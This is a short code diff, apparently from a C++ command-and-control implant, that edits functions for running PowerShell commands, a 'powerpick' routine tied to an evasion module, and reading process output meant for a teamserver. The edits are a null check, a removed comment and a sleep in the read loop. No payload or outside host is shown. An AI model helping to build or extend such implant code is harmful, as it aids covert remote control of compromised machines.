@@ -130,14 +130,13 @@ void core::execute_powershell(std::string cmd) {
 	PROCESS_INFO* info = process::create_process(genericFullCommand);
 	// to read from pipe
 
-	if (info->stdOutRd) {
+	if (info && info->stdOutRd) {
 		this->read_pipe(info->stdOutRd);
 	}
 
 }
 
 void core::execute_powerpick(std::string cmd) {
-	// NOT IMPLEMENTED
 	evasion::create_process(cmd.c_str());
 }
 bool core::invalid_char(char c)
@@ -151,6 +150,7 @@ void core::read_pipe(HANDLE rdPipe) {
 	BOOL bSuccess = FALSE;
 	std::string completeResult = "";
 
+
 	for (;;)
 	{
 		bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
@@ -162,7 +162,7 @@ void core::read_pipe(HANDLE rdPipe) {
 
 		std::string tempResult(str);
 		completeResult += tempResult;
-
+		Sleep(500);
 		//core::communicator->send_output();
 		// Send response to teamserver
 
